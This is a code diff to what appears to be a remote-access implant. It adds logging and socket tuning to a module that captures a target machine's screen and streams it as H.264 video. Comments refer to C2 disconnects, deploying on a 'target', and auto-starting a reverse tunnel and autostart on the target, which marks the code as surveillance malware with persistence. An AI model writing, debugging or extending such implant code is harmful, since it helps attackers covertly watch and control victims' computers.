@@ -693,11 +693,37 @@ class _S2SockWriter:
         self.sock = sock
 
     def write(self, b):
-        self.sock.sendall(b)
+        t0 = time.time()
+        try:
+            self.sock.sendall(b)
+        except Exception as e:
+            _s2_log("sendall %dB FAILED: %r" % (len(b), e))
+            raise
+        dt = time.time() - t0
+        if dt > 0.05:
+            _s2_log("sendall %dB took %.3fs (backpressure)" % (len(b), dt))
 
 
 def _s2_dir() -> str:
     return os.path.join(_base_dir(), INSTALL_DIR_NAME, STREAM2_DIR_NAME)
+
+
+def _s2_log(msg) -> None:
+    """Ring-buffer + append-only file log for the stream2 path. Survives
+    C2 disconnects; the tail is shown by 'stream2 status'."""
+    line = "%s %s" % (time.strftime("%H:%M:%S"), msg)
+    ring = _S2.setdefault("log", [])
+    ring.append(line)
+    del ring[:-200]
+    try:
+        p = os.path.join(_s2_dir(), "stream2.log")
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        with open(p, "a") as f:
+            f.write(line + "\n")
+        if os.path.getsize(p) > 1 << 20:
+            os.replace(p, p + ".old")
+    except Exception:
+        pass
 
 
 def _s2_bundle_name() -> str:
@@ -880,12 +906,13 @@ def _s2_make_encoder(name, w, h, fps, br):
     elif name == "h264_mf":
         c.options = {"usage": "1"}
     last = None
-    for _ in range(3):
+    for i in range(3):
         try:
             c.open()
             return c
         except Exception as e:
             last = e
+            _s2_log("encoder open try %d FAILED: %r" % (i + 1, e))
     raise RuntimeError("encoder open failed: %s" % last)
 
 
@@ -934,13 +961,17 @@ def _s2_run(target_id: str) -> None:
                 state="starting", w=STREAM2_DEF_W, h=STREAM2_DEF_H,
                 fps=STREAM2_DEF_FPS, viewers=0, bytes=0, frames=0,
                 degraded=False)
+    _s2_log("run start id=%s port=%d" % (target_id, port))
 
     try:
         _s2_load_runtime()   # bundle on embed runtimes, site-packages on dev
         import av            # AFTER load_runtime: may come from the bundle
         grab, stop_cam = _s2_capture()
+        _s2_log("runtime ok (av=%s)" % getattr(av, "__file__", "?"))
+        _s2_log("capture backend ready")
     except Exception as e:
         info.update(state="failed: %s" % e)
+        _s2_log("init FAILED: %r" % e)
         print("stream2: %s" % e, file=sys.stderr)
         return
     _use_gdi = False   # flipped on if dxcam stalls/fails -> _s2_gdi_grab
@@ -951,9 +982,11 @@ def _s2_run(target_id: str) -> None:
         srv.bind(("127.0.0.1", port))
         srv.listen(1)
         srv.settimeout(0.5)
+        _s2_log("listening 127.0.0.1:%d" % port)
     except Exception as e:
         stop_cam()
         info.update(state="failed: bind %s" % e)
+        _s2_log("bind FAILED: %r" % e)
         return
 
     enc_name = _s2_pick_encoder(STREAM2_DEF_W, STREAM2_DEF_H,
@@ -965,6 +998,7 @@ def _s2_run(target_id: str) -> None:
         return
     info["encoder"] = enc_name
     print("stream2: encoder=%s from %s" % (enc_name, av.__file__), file=sys.stderr)
+    _s2_log("encoder=%s" % enc_name)
     info.update(state="ready - waiting for viewer")
 
     while not stop.is_set():
@@ -982,6 +1016,7 @@ def _s2_run(target_id: str) -> None:
         # the viewer every few seconds (connect/disconnect loop). Dead
         # viewers are detected by TCP keepalive (~30s) instead.
         conn.settimeout(None)
+        _s2_log("viewer accepted peer=%s" % (conn.getpeername(),))
         try:
             # Bump the send buffer past the default 64KB so a ~70KB GOP
             # keyframe write doesn't wedge against the send window and stall
@@ -1001,10 +1036,18 @@ def _s2_run(target_id: str) -> None:
                 conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
         except OSError:
             pass
+        try:
+            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        except OSError:
+            pass
+        _s2_log("socket opts: SO_SNDBUF=1MB keepalive=on nodelay=on")
         writer = _S2SockWriter(conn)
         w, h, fps = STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS
+        pts_n = 0   # monotonic PTS counter: never reset at the rate tick
         info.update(state="streaming", viewers=1)
         viewer_dead = False
+        _s2_log("session start %dx%d@%d bitrate=%d" % (
+            w, h, fps, _s2_bitrate(w, h)))
         while not stop.is_set() and not viewer_dead:
             # (re)build the encoder + TS mux for the current resolution
             try:
@@ -1012,12 +1055,18 @@ def _s2_run(target_id: str) -> None:
                 mux = av.open(writer, "w", format="mpegts")
                 st = mux.add_stream("h264", rate=fps)
                 st.codec_context.extradata = enc.extradata or b""
+                _s2_log("enc open %s extradata=%dB" % (
+                    enc_name, len(st.codec_context.extradata or b"")))
+                _s2_log("mux open mpegts")
             except Exception as e:
                 info.update(state="failed: %s" % e)
+                _s2_log("enc/mux open FAILED: %r" % e)
                 viewer_dead = True
                 break
             n_frames = 0
             n_bytes = 0
+            none_ct = 0
+            pkt_ct = 0
             t0 = time.time()
             degrade = False
             try:
@@ -1031,6 +1080,7 @@ def _s2_run(target_id: str) -> None:
                             # dxcam stalled (get_latest_frame blocks forever when
                             # its DXGI backend dies) or raised -> switch to GDI
                             _use_gdi = True
+                            _s2_log("grab timeout/stall -> GDI fallback")
                             try:
                                 stop_cam()
                             except Exception:
@@ -1041,39 +1091,67 @@ def _s2_run(target_id: str) -> None:
                     else:
                         frame = grab()
                     if frame is None:
+                        none_ct += 1
+                        if none_ct == 1 or none_ct % 100 == 0:
+                            _s2_log("grab None x%d" % none_ct)
                         time.sleep(0.01)
                         continue
+                    none_ct = 0
                     src = av.VideoFrame.from_ndarray(frame, format="bgr24")
                     scaled = src.reformat(width=w, height=h,
                                           format="yuv420p",
                                           interpolation="BICUBIC")
-                    scaled.pts = n_frames * 1_000_000 // fps
+                    scaled.pts = pts_n * 1_000_000 // fps
                     scaled.time_base = Fraction(1, 1_000_000)
+                    n_pkts = 0
                     for pkt in enc.encode(scaled):
+                        n_pkts += 1
                         pkt.stream = st
-                        mux.mux(pkt)
+                        try:
+                            mux.mux(pkt)
+                        except Exception as e:
+                            _s2_log("mux.mux FAILED: %r" % e)
+                            raise
                         n_bytes += pkt.size
+                        pkt_ct += 1
+                        if pkt_ct <= 10 or pkt.is_keyframe or pkt_ct % 30 == 0:
+                            _s2_log("frame %d src=%s pkt=%dB%s pts=%s" % (
+                                n_frames, "gdi" if _use_gdi else "dx",
+                                pkt.size, " KEY" if pkt.is_keyframe else "",
+                                pkt.pts if pkt.pts is not None else "-"))
+                    if n_frames == 0:
+                        _s2_log("first frame -> %d pkt(s)" % n_pkts)
+                    elif n_frames < 5 and n_pkts == 0:
+                        _s2_log("encode buffered frame %d (0 packets)" % n_frames)
                     n_frames += 1
+                    pts_n += 1
                     now = time.time()
                     if now - t0 >= 5.0:
                         real = n_frames / max(now - t0, 0.001)
+                        _s2_log("stats real=%.1ffps frames=%d bytes=%d" % (
+                            real, n_frames, n_bytes))
                         info.update(bytes=info.get("bytes", 0) + n_bytes,
                                     frames=info.get("frames", 0) + n_frames)
                         if real < fps * 0.6 and not info.get("degraded")\
                                 and w > 640:
                             w, h, fps = w // 2, h // 2, max(10, fps // 2)
                             info.update(w=w, h=h, fps=fps, degraded=True)
+                            _s2_log("DEGRADE real=%.1ffps -> %dx%d@%d" % (
+                                real, w, h, fps))
                             degrade = True
                         else:
                             n_frames, n_bytes, t0 = 0, 0, now
-            except OSError:
-                pass    # viewer disconnected
+            except OSError as e:
+                _s2_log("OSError in encode loop: %r" % e)
             except Exception as e:
+                _s2_log("stream error: %r" % e)
+                info["last_error"] = str(e)   # survives the state overwrite below
                 info.update(state="stream error: %s" % e)
             try:
                 mux.close()
-            except Exception:
-                pass
+                _s2_log("mux closed")
+            except Exception as e:
+                _s2_log("mux.close FAILED: %r" % e)
             # A viewer drop ends the session, but a resolution DEGRADE keeps
             # the same connection: the rebuilt encoder/mux changes SPS and the
             # player v3 detects it at the AU level and recreates its decoder
@@ -1082,17 +1160,22 @@ def _s2_run(target_id: str) -> None:
             # cycle on every degrade.
             if not degrade:
                 viewer_dead = True
+            _s2_log("session end degrade=%s -> viewer_dead=%s" % (
+                degrade, viewer_dead))
         try:
             conn.close()
         except OSError:
             pass
         info.update(viewers=0, state="ready - waiting for viewer")
+        _s2_log("viewer closed; waiting for next")
+    _s2_log("stream2 exiting loop")
     try:
         srv.close()
     except OSError:
         pass
     stop_cam()
     info.update(state="stopped")
+    _s2_log("stream2 stopped")
 
 
 def deploy_stream2(cmd: str) -> bytes:
@@ -1112,6 +1195,7 @@ def deploy_stream2(cmd: str) -> bytes:
         _S2["th"] = threading.Thread(target=_s2_run, args=(target_id,),
                                      daemon=True, name="s2-" + target_id)
         _S2["th"].start()
+        _s2_log("deploy id=%s" % target_id)
     p = STREAM2_PORT_BASE + int(target_id)
     # best-effort: auto-start the reverse tunnel like deploy_vnc does; if the
     # bat cannot be fetched the streamer still works (tunnel can be added later)
@@ -1143,7 +1227,9 @@ def stop_stream2(cmd: str) -> bytes:
         if not th or not th.is_alive():
             return b"[*] stream2 not running\n" + MARKER
         _S2["stop"].set()
+        _s2_log("stop requested")
     th.join(timeout=8)
+    _s2_log("stop joined alive=%s" % th.is_alive())
     with _S2["lock"]:
         _S2["th"] = None
     # best-effort: tear down the reverse tunnel + autostart on the target
@@ -1183,6 +1269,12 @@ def stream2_status() -> bytes:
         int(time.time() - info.get("started", time.time())),
         info.get("bytes", 0)))
     lines.append("    stream:   tcp://127.0.0.1:%s" % info.get("port", "?"))
+    if info.get("last_error"):
+        lines.append("    last_err: %s" % info["last_error"])
+    ring = _S2.get("log") or []
+    tail = ring[-60:]
+    lines.append("    --- log tail (%d/%d) ---" % (len(tail), len(ring)))
+    lines.extend("    " + ln for ln in tail)
     return ("\n".join(lines) + "\n").encode() + MARKER
 
 
